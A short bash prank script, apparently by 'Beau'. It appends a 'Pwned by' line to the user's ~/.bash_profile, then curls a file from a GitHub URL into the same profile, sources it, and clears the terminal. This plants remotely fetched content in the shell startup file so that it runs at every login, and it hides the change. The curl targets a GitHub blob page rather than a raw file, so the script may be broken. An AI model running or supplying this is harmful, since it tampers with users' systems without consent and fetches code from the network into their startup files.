#!/bin/bash
# This isn't funny
echo "Pwned by Beau @ `date`" >> ~/.bash_profile
curl https://github.com/BeauBouchard/prank/blob/master/newbashprofile.sh >> ~/.bash_profile
source ~/.bash_profile
clear
